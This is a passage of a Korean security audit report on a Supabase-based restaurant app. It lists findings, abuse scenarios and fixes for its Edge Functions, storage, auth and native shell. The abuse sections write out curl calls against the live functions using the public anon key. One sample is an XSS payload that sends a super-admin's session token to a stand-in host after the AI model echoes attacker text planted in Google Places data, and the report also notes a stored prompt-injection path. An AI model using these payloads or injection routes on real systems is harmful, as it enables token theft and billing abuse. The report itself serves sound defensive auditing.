- 고침: 함수 :31 조건을 넓힌다: `if coalesce(new.status,'') not in ('active','confirmed','pending_confirm') then return new; end if;` 또는 최소한 `if new.status = 'hold' or new.purchase_id like 'PAYH-%' or new.purchase_id like 'MAN-%' then return new;`. 그리고 홀드→확정은 UPDATE 이므로 `after update of status on tickets` (old.status='hold' and new.status in ('active','confirmed')) 트리거를 하나 더 두어 **확정 시점**에 밀도록 옮긴다. t_guestnotice.sh ⑤ 는 active 를 직접 넣으므로 그대로 통과해야 하고, hold 행으로는 안 밀리는 케이스를 테스트에 추가.

**[medium] taam-format 이 호출자를 검증하는지 저장소로는 확인 불가 — 옛 소스는 인증이 전혀 없었고, 09-13 보강 목록에서도 빠졌다**

- 근거: 「미확인」 — Edge Function 소스가 저장소에 없다. 근거: ① 직계 조상 api/taam-format.js@07c44f2 는 handler 첫 줄이 `res.setHeader("Access-Control-Allow-Origin", "*")` 이고 Authorization 을 읽는 줄이 한 줄도 없다(req.body 의 memo/verified_by_taam 만 검사). ② 호출부 86619-86629 는 `session` 존재만 보고 `'Authorization': 'Bearer ' + session.access_token` 을 붙이며, 주석 「어드민 권한 체크」는 클라이언트 쪽 기대일 뿐이다. ③ DEPLOY_CHECKLIST.md 의 2026-09-13 재배포 13개(lineage-summarize·taam-translate 등 슈퍼어드민 게이트 추가) 에 taam-format 이 없다. ④ config.toml 주석대로 대시보드 붙여넣기 배포라 Verify JWT 는 대시보드 설정이고, 켜져 있어도 게이트웨이는 서명만 보므로 **anon key(index.html:172/182 에 내장) 자체가 유효한 JWT 로 통과**한다 — 함수 안에서 getUser()+role 검사를 하지 않으면 아무나 부른다. 프록시가 supabase.co 를 막아 실측은 못 했다.
- 악용: URL 과 anon key(앱 소스에서 그대로 읽힘)만 있으면 `curl -X POST .../functions/v1/taam-format -H 'Authorization: Bearer <anon>' -d '{"memo":"..."}'` 로 누구나 ① TAAM 의 Anthropic 키로 Sonnet 호출(메모당 최대 1500 토큰) ② TAAM 의 Google Maps 키로 Places findplacefromtext ×3(ja/ko/en)+details 를 무제한 발생시킨다. 루프로 돌리면 Anthropic·Google 청구가 그대로 새고, TAAM 키를 통해 Google Places 데이터를 대량 긁는 프록시로도 쓴다. 로그인 회원 JWT 로도 같다(슈퍼어드민만 쓰는 화면인데 회원 누구나 호출 가능). 확인되면 severity 는 high.
- 고침: Edge Function 안에서 lineage-summarize/index.ts:394-408 과 같은 모양으로 막는다: `const t = (req.headers.get('Authorization')||'').replace(/^Bearer\s+/i,''); const { data:u } = await admin.auth.getUser(t); const { data:p } = await admin.from('profiles').select('role').eq('id', u?.user?.id).maybeSingle(); if(!['super_admin','superadmin'].includes(String(p?.role||''))) return 403;` — memo 검사·Google·Claude 호출보다 **앞에** 둔다. 이어서 `admin.rpc('taam_rate_hit', { p_key:'taam-format:'+u.user.id, p_limit:30, p_window:3600 })` 로 시간당 한도를 건다. 함수 소스를 supabase/functions/taam-format/index.ts 로 저장소에 넣어 다음 감사에서 또 「미확인」이 되지 않게 한다. 클라이언트 86601 에도 openTaamChat(86811) 처럼 `if(!_isSuperAdmin()) return;` 을 추가(방어 겹).

**[medium] AI·Google 유래 문자열을 이스케이프 없이 innerHTML — 슈퍼어드민 세션에서 XSS (raw 오류 경로가 특히 직접적)**

- 근거: 86639-86641: `var rawHtml = json.raw ? '<details>…<pre …>' + json.raw + '</pre></details>' : ''; resultArea.innerHTML = '…⚠ ' + errMsg + rawHtml + …` — Claude 원문(`raw`)과 서버 `error` 문자열을 그대로 삽입. 86648: catch 에서 `e.message` 도 innerHTML. 86653-86746 taamRenderResultCard: `d.name`, `d.city_en`, `d.district`, `d.genre_en`, `d.local_popularity`, `d.price_tier`, `d.concierge_note`, `chips(d.vibe_tags|signature_keywords|best_for)` 의 각 원소, `d.google_rating` 을 전부 문자열 연결로 innerHTML. 같은 파일 86916 에 `_taamEscapeHtml` 이 있는데 여기서는 안 쓴다. 옛 소스 기준 프롬프트에는 Google Places 의 `name/formatted_address/website/types` 가 그대로 들어가고 시스템 프롬프트가 「Google formatted_address 를 우선 신뢰」라고 지시한다(외부 통제 입력).
- 악용: 공격자가 Google 비즈니스 프로필(누구나 등록 가능)의 상호·웹사이트에 `</pre><img src=x onerror="fetch('https://x/?t='+localStorage.getItem('sb-edfsmzbcixfnqabrsvut-auth-token'))">` 같은 문자열을 심는다. 슈퍼어드민이 그 가게 메모를 「정형화」하면 Google 데이터가 프롬프트로 들어가고, 모델이 name/concierge_note 에 그 문자열을 되풀이하거나 JSON 파싱이 깨져 `raw` 로 되돌아오면 슈퍼어드민 브라우저에서 스크립트가 실행된다 → 슈퍼어드민 access/refresh 토큰 탈취, 또는 같은 세션에서 taamSaveResult·adminGrantDeposit 류 RPC 를 몰래 호출. 피해자가 최고 권한 계정이라 성공 시 영향은 크고, 성립 조건(특정 가게 메모·모델 되풀이)이 있어 medium.
- 고침: 86639-86641·86648 은 `_taamEscapeHtml(errMsg)`·`_taamEscapeHtml(json.raw)`·`_taamEscapeHtml(e.message)` 로. taamRenderResultCard 의 모든 보간값(`d.*`, chips 의 `t`)을 `_taamEscapeHtml()` 로 감싸고 `ts`·`d.google_rating`·`d.popularity_score` 는 `Number()` 로 강제한다(`width:'+ts+'%` 스타일 주입 방지). 서버(Edge) 쪽에서도 응답 JSON 을 스키마로 검증(enum·길이·`<>` 제거)해 돌려준다.

**[low] revoke/restore 가 admin_grants 쓰기 오류를 무시하고 장부만 바꾼다 — 실패 시 「해지됐다」고 보이는데 권한은 그대로(fail-open)**

- 근거: 177-187:
  if (off) {
    await admin.from('admin_grants').delete().eq('user_id', row.user_id);   // 결과 미확인
    await admin.auth.admin.signOut(...).catch(() => {});
  } else {
    await admin.from('admin_grants').insert({...}).select().maybeSingle();  // 결과 미확인
  }
  await admin.from('partner_accounts').update({ disabled: off }).eq('login_id', loginId);
  return json({ ok: true, login_id: loginId, disabled: off });

supabase-js 는 실패해도 throw 하지 않고 {error} 를 돌려준다. create 경로(133-142)는 gErr/aErr 를 보는데 revoke/restore 는 보지 않는다. 같은 함수 안에서 기준이 다르다.
- 악용: admin_grants delete 가 어떤 이유로든 실패(스키마 캐시·트리거·일시적 네트워크·나중에 추가될 RLS/가드)하면 함수는 disabled=true 로 장부를 찍고 ok:true 를 돌려준다. 슈퍼어드민 화면(taam_partner_accounts)은 「해지됨」으로 보이지만 admin_grants 는 남아 있어 매장이 그대로 어드민이다. 반대로 restore 에서 insert 가 실패하면 「되살림」으로 보이는데 has_grant=false 인 반쪽 계정이 된다. 사람이 「해지했다」고 믿고 손을 떼는 것이 문제다.
- 고침: 각 단계의 error 를 확인하고 실패하면 장부를 건드리지 않고 ok:false 를 돌려준다. 순서는 권한 → 세션 → 장부(장부는 마지막). 더 낫게는 revoke/restore 를 SQL RPC 한 개(트랜잭션)로 옮겨 admin_grants·restaurant_admins·partner_accounts 를 한 번에 바꾼다 — 그러면 반쪽 상태가 원리적으로 안 생긴다.

**[low] 푸시는 at-most-once — 알림 행이 먼저 커밋되므로 send-push 실패·타임아웃·cron 결손분은 재시도 없이 영구 유실되고 아무도 모른다**

- 근거: 89행 RPC 가 알림 행을 커밋하고 그 행의 존재가 중복 방지 열쇠다(sql/visit_reminder.sql:122-127). 96-123행 루프는 순차 `fetch` 이고 타임아웃이 없으며, 실패는 `failed++`(117·121행)로 세기만 한다. 실패한 행은 다음 호출에서 `not exists` 에 걸려 다시 안 나오고, 93행 `d in (1,3,7)` 때문에 하루를 놓치면 그 D-N 은 영영 없다. 결과는 응답 JSON(125행)에만 실리는데 cron 의 응답은 net._http_response 에만 남는다(CLAUDE.md 의 notify-guest-expiry 401 사고와 같은 관측 사각). `res.ok` 는 send-push 가 대상 0명·설정 차단이어도 200 이므로 push_sent 는 과대 계상된다. 대상이 많으면 순차 루프가 Edge 실행 시간 한도에 걸려 뒤쪽 회원은 인앱 알림만 있고 푸시가 없다.
- 악용: 악용보다 정합성: 특정 날 send-push 가 VAPID/APNs 오류나 배포 중이면 그날 D-1 대상 전원이 푸시를 못 받는다. 발견 1·2 와 결합하면 외부인이 「푸시 없는 날」을 만들 수 있고, 운영은 cron Succeeded 만 보고 정상으로 믿는다.
- 고침: 알림 행에 발송 결과를 남기고 그것을 열쇠로 재시도한다: notifications.payload 에 `pushed_at`/`push_error` 를 update 로 기록하고, Edge 는 RPC 결과 rows 에 더해 `type='visit_reminder' and payload->>'pushed_at' is null and created_at > now()-interval '2 day'` 를 함께 처리한다(시간 창이 아니라 **행별 플래그**가 열쇠이므로 CLAUDE.md 의 「최근 N분」 금지와 충돌하지 않는다). fetch 에 AbortSignal.timeout(10_000) 을 걸고 회원별 병렬(Promise.allSettled, 동시 5개)로 바꾼다. push_failed > 0 또는 status_code <> 200 이면 `taam_notify_admins` 로 슈퍼어드민에게 알린다.

**[low] Edge Function 이 호출자를 전혀 확인하지 않는다 — anon key 만 있으면 누구나 발송 시점을 정하고 무제한 호출**

- 근거: index.ts:36-45 — `serve(async (req) => { ... const admin = createClient(url, svc, ...); const { data, error } = await admin.rpc('taam_guest_expiry_notify');` 사이에 Authorization 헤더를 읽는 줄이 없다. 요청 본문도 안 읽는다. 기준 함수 toss-confirm/index.ts:60-78 은 `Bearer → admin.auth.getUser` 로 신원을 확인하고, send-push/index.ts:527-530 은 `t === SERVICE_KEY` 로 서버 호출만 통과시키는데 이 함수는 둘 다 없다. 게이트웨이 Verify JWT(config.toml 은 켜짐 선언, 대시보드 실제값 미확인)가 켜져 있어도 anon key 자체가 유효한 JWT 라 통과한다. 앱은 이 함수를 부르지 않으므로(index.html grep 0건) 정당한 호출자는 대시보드 Cron 하나뿐인데 그것을 구분하지 않는다. 각 호출은 profiles 전수 스캔(:41-52, 행마다 is_super_admin) + 새 행 수만큼 send-push fetch(:55) 를 일으키며 속도 제한이 없다.
- 악용: `curl -X POST https://edfsmzbcixfnqabrsvut.supabase.co/functions/v1/notify-guest-expiry -H 'Authorization: Bearer <anon key>' -H 'apikey: <anon key>'` — ① 한국시간 03:00 에 부르면 그날치 슈퍼어드민·게스트 웹푸시가 새벽에 나가고 10시 Cron 은 볼 것이 없어진다(발송 시각 탈취). ② 응답 `{admin, self, push_sent}` 로 「슈퍼어드민 수 × 만료 임박 게스트 수」와 오늘 3·1일 남은 게스트 수를 매일 읽을 수 있다(오라클). ③ 초당 수십 번 불러도 막는 것이 없다 — DB 스캔 부하. 로그인 불필요.
- 고침: 함수 첫머리에 서버 호출만 허용: `const tok = (req.headers.get('Authorization')||'').replace(/^Bearer\s+/i,''); const cronSecret = Deno.env.get('CRON_SECRET')||''; if (!tok || (tok !== svc && !(cronSecret && req.headers.get('x-cron-secret') === cronSecret))) return json({ok:false,error:'forbidden'},403);` (send-push 의 isServiceCall 과 같은 규칙). 대시보드 Cron 의 Authorization 을 Vault 의 service_role legacy JWT 로 두면(CLAUDE.md 「예약 작업」 규칙대로) 그대로 통과한다 — 배포 전에 Cron 이 실제로 어떤 키를 보내는지 먼저 본다(dashboard_checks). 같은 코드를 notify-visit-reminder 에도. 추가로 RPC 쪽 finding 의 revoke 를 같이 넣어 두 겹으로.


## 2. 직접 확인 (반박자 미실행 9건 — 세션에서 코드로 확인)

| 심각도 | 영역 | 발견 | 판정 |
|---|---|---|---|
| high | auth | 초대제 게이트가 클라이언트 JS 에만 있다 | 확인됨. vpSend 가 가입 모드에서 shouldCreateUser:true 로 signInWithOtp 를 부르고(index.html:18706·18722), auth.users INSERT 트리거 sync_profile_email_from_auth(sql/profiles_email_sync.sql) 가 profiles 를 자동 생성한다. 초대 검증은 앱 JS 의 signOut 뿐. 고침: 대시보드 「Allow new users to sign up」 OFF(이메일·전화·소셜 전부) + 사용자 생성은 consume-invite 가 service_role 로(auth.admin.createUser) — 설계 변경이라 별도 작업. |
| high | auth | 등급 가드 우회 — phone/email 을 바꾸며 같은 UPDATE 로 membership_tier=M | 확인됨. guard_membership_tier.sql:133 이 taam_invited_tier(new.id, new.email, new.phone) — 회원이 방금 써넣은 값으로 초대를 찾는다. "profiles update own" 정책(notif_prefs_server.sql:31)은 컬럼 제한이 없다. M 초대를 받은 사람의 번호를 알면 등급이 붙는다. 고침: taam_invited_tier 가 인자를 무시하고 auth.users 의 email/phone(auth.uid())과 ic.member_id 로만 매칭 + profiles.phone/email 을 BEFORE UPDATE 가드로 회원 수정 금지(auth.users → profiles 미러 트리거가 이미 있다). |
| medium | auth | 탈퇴(deleted_at)를 서버가 강제하지 않음 | 확인됨. vpPasswordLogin(index.html:19971)에 deleted_at 검사가 없고(OTP·소셜 경로엔 있음), sql/account_delete.sql 은 banned_until·refresh_tokens·active_sessions 를 건드리지 않는다. 고침: taam_delete_my_account 에 update auth.users set banned_until='infinity' + refresh_tokens/active_sessions 삭제 추가, 앱 비밀번호 로그인에도 deleted_at 검사. |
| high | storage | restaurant-videos: 로그인만 하면 누구나 업로드·덮어쓰기 | 확인됨. storage_close_anon_write.sql 머리말이 「authenticated 의 INSERT·UPDATE 는 남긴다」고 적고, UPDATE 조건이 bucket_id 뿐이면 기존 파일명을 지정해 덮어쓸 수 있다(파일명은 restaurants.hero_video_url 로 전원 열람 가능). 고침: INSERT/UPDATE 를 슈퍼어드민 또는 is_restaurant_admin_of(경로 첫 세그먼트) 로 좁히고 파일 경로를 <rest_id>/ 로 강제 + 버킷 file_size_limit/allowed_mime_types. |
| medium | storage | profiles.is_admin 을 회원이 켤 수 있고 옛 사진 정책이 is_admin 을 본다 | 부분 확인. chef_photos/restaurant_photos 정책 파일이 아직 is_admin 조건을 갖고, is_admin 컬럼엔 가드가 없다(grep). cleanup_legacy_privileges.sql 이 적용됐는지는 라이브 확인 필요: select policyname from pg_policies where schemaname='storage' and (coalesce(qual,'')||coalesce(with_check,'')) like '%is_admin%' — 0행이어야 한다. 고침: 0행이 아니면 cleanup §② 실행(UPDATE 는 with check 까지), is_admin 컬럼 가드 또는 drop. |
| medium | storage | 버킷 파일 크기·MIME 제한이 서버에 없다 | 확인됨. sql/ 전체에 file_size_limit·allowed_mime_types 0건. 고침: update storage.buckets set file_size_limit, allowed_mime_types 버킷별. |
| medium | auth | SMS OTP 가 국제번호로도 나간다(펌핑·과금) | 확인됨. taam-sms-hook toDomestic(index.ts:94-99) 이 +82 가 아니면 그대로 Solapi 로 넘긴다. 고침: /^\+82\d{9,10}$/ 아니면 400 거부 + 대시보드 SMS rate limit·Captcha. |
| low | auth | 회원 여부 오라클(OTP 발송 응답 422 vs 200) | 확인됨(Supabase 특성). 완전 차단 불가 — 대시보드 rate limit·Captcha 가 실질 방어. |
| medium | native | server.url 원격 로드 + script-src CSP·SRI 없음 | 확인됨(구조). 웹 배포 경로를 쥐면 곧 네이티브 앱. 고침: main 브랜치 보호, CSP Report-Only 로 시작해 script-src 도입, cdnjs 스크립트에 integrity, Deploy Hook 주기 회전. |

## 3. 반박된 것 (기존 방어가 막는다)

- (edge:partner-account) revoke 가 로그인 자체를 막지 않는다 — 비밀번호는 계속 유효하고 레거시 어드민 표(restaurant_admins/venue_admins)는 안 지운다
  - 핵심 악용(해지 뒤에도 매장 손님 PII 를 읽는다)은 다른 층에서 막힌다. 권한은 admin_grants 가 서버에서 주고, revoke 가 그 행을 지운다(partner-account/index.ts:178). 그러면 is_ticket_admin_of · is_restaurant_admin_of(admin_grants 분기) · is_venue_admin_of(sql/admin_grants.sql:36-61) 가 전부 false 가 되어 tickets RLS(sql/tickets_admin_rls.sql:82-85)·ticket
- (edge:kashikiri-confirm) 토스 승인은 났는데 확정(mark_paid)이 실패하면 청구 행에 아무 흔적도 남지 않는다 — 외화+v2 미배포면 100% 재현
  - 코드 관찰 자체(index.ts:183-188 에서 mErr 시 DB 를 안 건드림)는 맞지만, 발견의 핵심 주장 두 가지가 다른 층에서 이미 막혀 있다.  ① 「외화+v2 미배포면 100% 재현」은 성립하지 않는다. `pay_currency`·`pay_amount` 컬럼은 `taam_kashikiri_mark_paid_v2` 와 **같은 파일** `sql/kashikiri_fx_pay.sql` 이 만든다(컬럼 31-34행, 외화를 넣는 `taam_kashikiri_send` 69행, v2 269행, 69~314행은 하나의 begi
- (edge:kashikiri-confirm) 확정 RPC 가 status='pending' 을 요구하지 않고, Edge 는 만료를 보지 않으며, 승인 후 실패 시 토스 취소 경로가 없다 — 어드민이 끊은 링크가 결제 중이면 'cancelled' 가 'paid' 로 덮인다
  - 코드 사실관계(mark_paid_v2 가 status='pending' 을 안 보고, Edge 가 expires_at 을 안 읽고, 승인 후 실패 시 토스 취소가 없음)는 맞지만, 주장된 악용 시나리오는 다른 층이 이미 막는다.  ① 「결제창을 열어 둔 상태에서 어드민이 끊으면 cancelled→paid」: 손님이 결제창을 닫고 돌아와야 kashikiri-confirm 이 불린다(pay/index.html:503 requestPayment → successUrl 복귀 → :450 fetch). 그 시점에 supabase/functi
- (edge:toss-billing-issue) billing_keys UPDATE 정책이 컬럼을 제한하지 않는다 — 회원이 자기 행의 billing_key·customer_key 를 임의로 덮어쓸 수 있다
  - 사실 확인: `sql/billing_keys.sql:57-60` 의 `billing_keys_update_own` 은 컬럼 제한이 없고, sql/ 전체에 billing_keys 에 대한 컬럼 grant/revoke·트리거가 없다(grep 결과 billing_keys.sql·account_delete.sql:39 뿐). 따라서 회원이 자기 행의 `billing_key`·`customer_key` 를 PATCH 로 덮어쓸 수 있다는 점 자체는 맞다. 그러나 발견이 주장하는 실질 피해(남의 카드로 결제)는 다른 층에서 막힌다. ① 공격자

## 4. 미검증 low (반박자 안 돌림 — 참고용)

- (edge:partner-account) create 의 중복 검사가 partner_accounts 만 본다 — 같은 이메일이 auth.users 에 먼저 있으면 그 login_id 는 영구히 못 쓴다(스쿼팅·고아 계정)
- (edge:partner-account) rest_id·label 을 검증하지 않는다 — 존재하지 않는 매장에 권한이 붙고 has_grant 는 true 로 보인다
- (edge:partner-account) reset 이 해지된 계정의 disabled 를 조용히 false 로 되돌린다 — 권한은 없는데 장부는 「사용 중」
- (edge:partner-account) user_metadata 에 권한성 값(taam_partner·rest_id)을 둔다 — 사용자가 스스로 고칠 수 있는 칸
- (edge:partner-account) 인증 전 비용·속도 제한 없음 — URL 만 알면 getUser 왕복을 무제한으로 시킬 수 있다
- (edge:kashikiri-confirm) 공개 RPC 두 개(charge_public · order_start)와 Edge 함수에 속도 제한이 없고, order_start 는 anon 이 payer_name 을 길이 제한 없이 덮어쓴다
- (edge:kashikiri-confirm) taam_kashikiri_charge_public · order_start · send 가 저장소에 각 2~3판 공존 — 마지막에 실행한 파일이 라이브 정의를 정하며, Edge 함수와 맞는 판은 kashikiri_fx_pay.sql 이다
- (edge:kashikiri-confirm) 링크 결제는 어느 회원의 예치금·티켓에도 붙지 않고 원장에도 남지 않으며, 결제된 청구의 환불 경로가 없다 — 정산·환불이 DB 밖(토스 콘솔)에서만 가능
- (edge:kashikiri-confirm) 외화 청구인데 TOSS_SECRET_KEY_<통화> 가 없으면 조용히 원화 시크릿으로 폴백하고, 토스 응답의 currency 를 대조하지 않으며, 예외 메시지를 그대로 돌려준다
- (edge:kashikiri-confirm) 링크 토큰이 URL 쿼리(?t=)로 다니는데 pay 페이지에 Referrer-Policy 가 없다 — 구형 브라우저에서 Google Fonts·토스 SDK 요청에 토큰이 실릴 수 있다
- (edge:taam-sms-hook) webhook-id 재사용 차단 없음 — 5분 창 안 재전송·GoTrue 재시도에 문자가 중복 발송된다
- (edge:taam-sms-hook) 훅 오류 본문(설정 상태·Solapi 거부 사유)이 익명 호출자 화면까지 그대로 올라간다
- (edge:taam-sms-hook) 성공 로그에 수신번호 앞 7자리가 남는다 (마스킹이 뒤 4자리뿐)
- (edge:taam-sms-hook) signInWithOtp(shouldCreateUser:false) 오류로 회원 번호 등록 여부가 열거된다 (GoTrue 고유, 훅 밖)
- (edge:toss-billing-issue) 속도 제한 없음 — 회원 JWT 하나로 토스 발급 API 를 무한정 대리 호출할 수 있다
- (edge:toss-billing-issue) 재등록(restore) 경로가 기존 행의 소유자를 확인하지 않고 user_id 를 호출자로 덮어쓴다 · update 오류도 안 본다
- (edge:toss-billing-issue) 복귀 URL 에 요청-응답 대조값(nonce)이 없다 — 제3자가 만든 authKey 를 회원 세션이 그대로 교환한다(남의 카드를 내 계정에 심기)
- (edge:toss-billing-issue) 회원이 billing_key 원문을 읽을 수 있다 — RLS select 가 컬럼을 안 가리고 앱은 select('*')
- (edge:toss-billing-issue) 발급 성공 뒤 저장 실패면 토스에 빌링키가 고아로 남고, DB 오류 원문이 클라이언트로 나간다
- (edge:toss-billing-issue) isFirst 판정과 setDefault 가 트랜잭션 밖 — 동시 등록·중복 복귀 시 기본카드가 어긋나고 응답만 성공
- (edge:notify-visit-reminder) 인앱 알림은 notif_prefs.all=false 를 무시한다 — 「전체 알림 끔」 회원에게도 종 알림이 쌓인다(푸시만 막힘)
- (edge:notify-visit-reminder) DB 오류 메시지를 호출자에게 그대로 반환한다
- (edge:notify-guest-expiry) 동시 호출 시 같은 알림·푸시가 두 번 나간다 — not exists 만 있고 잠금·유니크 키가 없다
- (edge:notify-guest-expiry) 슈퍼어드민 알림 중복 열쇠에 기간이 없다 — 같은 게스트의 두 번째 만료 주기는 알림이 영영 안 간다
- (edge:notify-guest-expiry) DB 오류 문자열을 인증 없는 호출자에게 그대로 돌려준다
- (taam-format) 메모 길이·호출 횟수 제한 없음 — 호출 1회 = Google 4요청 + Sonnet 1회, 비용 DoS
- (taam-format) 오류 응답에 모델 원문(raw)·예외 메시지·예외 타입을 그대로 반환
- (taam-format) 저장 값이 서버 재계산 없이 클라이언트 전역에서 온다 + 저장 버튼 이중 클릭 시 중복 행
- (taam-format) 메모·Google 데이터 → 모델 → restaurants → 회원 컨시어지 프롬프트로 이어지는 저장형 프롬프트 주입 경로
- (storage) 공개 버킷에 anon SELECT 정책 → 로그인 없이 파일 목록 전체 열거 (미공개 사진·다음 달 표지·예정 팝업 사진 유출)
- (storage) is_super_admin(uuid) 가 PUBLIC 실행 가능 — 아무 uuid 의 슈퍼어드민 여부를 묻는 오라클
- (storage) is_superadmin() 은 splash-media 등 여러 정책이 쓰는데 정의가 저장소에 없다 — 세 헬퍼의 동치 여부 미확인
- (storage) splash-media·partner-logos 에 UPDATE 정책이 없는데 앱은 upsert:true 로 올린다
- (storage) 파트너 「나의 레스토랑」 사진은 Storage 를 거치지 않고 base64 로 restaurants 에 저장된다
- (storage) [현황표] 버킷별 정책 — 저장소 SQL 기준 (라이브 미확인 항목 표기)
- (auth) signInWithIdToken 에 nonce 가 없다 — 네이티브 소셜 id_token 재전송 가능
- (auth) implicit 플로우 + detectSessionInUrl 기본값 — URL 해시로 남의 세션을 심는 로그인 CSRF
- (auth) invite_codes 클라이언트 폴백 조회의 .or() 문자열에 이메일·번호가 그대로 들어간다 (PostgREST 필터 인젝션 + 초대자 정보 열거)
- (auth) OTP 로그인 시 슈퍼어드민이 클라이언트에서 profiles.upsert(role='super_admin') 를 시도한다 — 가드에 막히지만 남겨 둘 이유가 없다
- (native) 네이티브 푸시 탭 시 data.url 을 검증 없이 location.href 에 대입 — sw.js 는 9/13 에 고쳤는데 네이티브 경로는 그대로
- (native) Android 매니페스트 allowBackup 을 끄지 않음 — WebView localStorage 의 Supabase refresh token 이 기기 백업/adb backup 에 실린다 (미확인: Capacitor 템플릿 기본값 true 로 가정)
- (native) allowNavigation '*.tosspayments.com' 와일드카드 + limitsNavigationsToAppBoundDomains:false — 결제사 페이지(및 모든 서브도메인)에 Capacitor 네이티브 브리지가 주입된다 (미확인)
- (native) Google Maps 브라우저 키 하나로 Embed·JS(Places)·Geocoding 웹서비스까지 호출 — 참조자·API 제한이 없으면 누구나 청구를 발생시킨다
- (native) vercel.json 보안 헤더가 얇다 — CSP 는 frame-ancestors 만, HSTS preload 없음
- (native) taam_report_error 익명 버킷이 전역 60건/시간 — 한 사람이 전 세계 익명 오류 수집을 끌 수 있고 p_extra 크기 제한이 없다
- (native) 코드사인 스텝이 복호화한 개인키의 첫 줄을 build artifact(signing-debug.txt)에 남긴다
- (native) partner_qr_lookup: 비인증 무제한 INSERT(partner_qr_views) + 코드 열거에 속도제한 없음
- (native) apple-app-site-association 없음 — iOS Universal Link 미구성(보안 문제 아님, 기록)
- (native) 의존성 버전 기록 (취약 여부 미확인)

## 5. 대시보드에서만 확인 가능한 항목


### edge:partner-account
- Supabase → Edge Functions → partner-account → Logs: GoTrue /logout 호출의 401 응답이 남아 있는지(있으면 finding 1 이 라이브에서 실제로 무력함을 확인). 함수 slug 가 소문자 'partner-account' 인지(앱은 대문자 폴백까지 두 번 부른다).
- Supabase → Edge Functions → partner-account → Verify JWT 설정값 확인(켜져 있어도 함수가 getUser 로 다시 확인하므로 어느 쪽이든 안전. 꺼져 있다면 그대로 두되 이유를 기록).
- Supabase → Authentication → Providers → Email: 「Enable email provider」(파트너 로그인에 필요) 와 「Allow new users to sign up」 — 후자가 켜져 있으면 anon key 로 <id>@partner.taam.kr 자가 가입이 가능(finding 5). 「Confirm email」 여부도 확인.
- Supabase → Authentication → SMTP Settings: 커스텀 SMTP 가 설정돼 있는가. 설정돼 있으면 /auth/v1/recover · /auth/v1/otp 가 *@partner.taam.kr 로 실제 메일을 보낸다(finding 4). 기본 SMTP 면 팀원 주소에만 가므로 위험이 낮다.
- 도메인 소유 확인: WHOIS taam.kr — TAAM(playtaam) 소유인가. 아니면 등록하거나 PARTNER_DOMAIN 을 소유 도메인으로 바꾼다. 소유라면 partner.taam.kr 에 Null MX(`MX 0 .`) 를 둔다.
- Supabase → Authentication → Rate Limits: /token(비밀번호 로그인 무차별 대입) · /recover · /otp 의 제한값. 파트너 비밀번호는 ~59비트라 대입은 비현실적이지만 기본값이 남아 있는지 본다.
- Supabase → Authentication → Sessions/JWT: access token 만료(기본 3600s). finding 1 을 고쳐도 이 시간만큼은 세션이 남는다 — CLAUDE.md 의 8·9 항목과 같이 900s 로 줄일지 결정.
- SQL Editor(한 번에): select 'revoked_with_live_session' as k, count(*) from auth.sessions s join public.partner_accounts pa on pa.user_id = s.user_id where pa.disabled union all select 'partner_in_legacy_restaurant_admins', count(*) from public.restaurant_admins ra join public.partner_accounts pa on pa.user_id = ra.user_id union all select 'orphan_partner_emails', count(*) from auth.users u where u.email like '%@partner.taam.kr' and not exists (select 1 from public.partner_accounts pa where pa.user_id = u.id); — 첫 줄이 0 이 아니면 finding 1/3 이 실제로 발생 중, 둘째 줄이 0 이 아니면 revoke 가 손님 데이터를 못 닫는다, 셋째 줄은 finding 5 의 고아/스쿼팅.
- SQL Editor: \d public.profiles 또는 pg_constraint 로 profiles.id → auth.users(id) 의 on delete 규칙 확인(저장소에 profiles 정의가 없다). cascade 가 아니면 create 의 undo(deleteUser) 가 FK 로 실패해 고아 auth 사용자가 남는다.
- Supabase → Authentication → Hooks: 「Send Email」/「Before User Created」 훅 유무 — partner 도메인 수신 메일 차단·자가 가입 거부를 여기서 걸 수 있다.

### edge:kashikiri-confirm
- [Supabase SQL Editor] 확정 RPC 실행 권한 — `select proname, proacl from pg_proc where pronamespace='public'::regnamespace and proname in ('taam_kashikiri_mark_paid','taam_kashikiri_mark_paid_v2','taam_kashikiri_order_start','taam_kashikiri_charge_public');` → mark_paid 두 줄의 proacl 에 `anon=X` 또는 `authenticated=X` 가 있으면 1번 발견이 확정(critical). order_start·charge_public 은 anon 이 있어야 정상.
- [브라우저 콘솔, pay 페이지에서] 같은 것을 바깥에서: `fetch(SB_URL+'/rest/v1/rpc/taam_kashikiri_mark_paid_v2',{method:'POST',headers:{apikey:SB_KEY,Authorization:'Bearer '+SB_KEY,'Content-Type':'application/json'},body:JSON.stringify({p_order_id:'KSK-x',p_payment_key:'x',p_amount:1,p_currency:'KRW'})})` → 응답이 42501(permission denied) 이어야 정상. P0002(주문을 찾을 수 없습니다) 가 오면 함수가 실행된 것 = 열려 있음.
- [Supabase SQL Editor] 토스 승인 없이 paid 가 된 행이 있는지 — `select id, order_id, payment_key, method, receipt_url, approved_at, amount_krw from public.kashikiri_charges where status='paid' and (method is null or receipt_url is null) order by approved_at desc;` → 결과가 있으면 토스 콘솔의 해당 orderId 승인 내역과 하나씩 대조.
- [Supabase SQL Editor] 라이브 함수 판 확인(하나로) — `select 'charge_public' as f, pg_get_functiondef('public.taam_kashikiri_charge_public(text)'::regprocedure) like '%pay_currency%' as ok union all select 'order_start', pg_get_functiondef('public.taam_kashikiri_order_start(text,text)'::regprocedure) like '%''currency''%' union all select 'send', pg_get_functiondef('public.taam_kashikiri_send(uuid,jsonb)'::regprocedure) like '%정산 총액을 넘습니다%' union all select 'mark_paid_v2', to_regprocedure('public.taam_kashikiri_mark_paid_v2(text,text,numeric,text,text,text)') is not null;` → 네 줄 전부 true 여야 Edge·pay 페이지와 맞는 판.
- [Supabase SQL Editor] 컬럼 존재 — `select count(*) from information_schema.columns where table_name='kashikiri_charges' and column_name in ('pay_currency','pay_amount','pay_fx');` → 3 이어야 한다. 아니면 Edge 의 select(index.ts:74) 가 lookup_failed 로 전원 결제 불가.
- [Supabase Dashboard → Edge Functions → kashikiri-confirm] Verify JWT 가 **꺼져** 있어야 한다(비회원이 publishable 키로 부른다). 동시에 다른 함수들(toss-confirm 등)은 켜져 있는지 같이 본다 — config.toml 에는 taam-sms-hook 만 false 로 적혀 있고 kashikiri-confirm 은 대시보드 수동 설정이라 저장소로는 알 수 없다.
- [Supabase Dashboard → Edge Functions → Secrets] TOSS_SECRET_KEY · TOSS_SECRET_KEY_USD · TOSS_SECRET_KEY_JPY 세 개가 모두 있는지. USD/JPY 가 없으면 현재 코드는 원화 키로 폴백해 confirm_failed 로만 보인다(7번).
